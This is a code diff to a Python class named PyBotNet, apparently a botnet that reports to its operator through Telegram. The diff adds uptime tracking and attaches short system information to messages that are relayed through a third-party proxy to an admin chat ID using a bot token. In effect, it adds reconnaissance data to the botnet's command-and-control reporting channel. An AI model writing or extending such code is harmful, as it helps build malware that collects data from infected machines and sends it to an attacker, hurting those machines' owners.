@@ -25,6 +25,7 @@ class PyBotNet:
         self.show_log = show_log  # show logs
         self.send_system_data = send_system_data  # send system info in message
 
+        self.start_time = util.get_current_epoc_time()
         # logging:
         if self.show_log:
             # show all log's
@@ -39,11 +40,17 @@ class PyBotNet:
     def __str__(self) -> str:
         return settings.pybotnet_info
 
+    def pybotname_up_time(self) -> int:
+        return util.get_current_epoc_time() - self.start_time
+
     def send_message_by_third_party_proxy(self, message):
         '''Send messages by api url and third party proxy to adimn'''
 
-        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
-                                                      self.ADMIN_CHAT_ID, message)
+        if self.send_system_data:
+            message = f'{message} \n {util.get_short_system_info(self.pybotname_up_time())}'
+
+        self.api_url = util.make_send_message_api_url(
+            self.TELEGRAM_TOKEN, self.ADMIN_CHAT_ID, message)
 
         return util.post_data_by_third_party_proxy(self.api_url, self.logger)
 
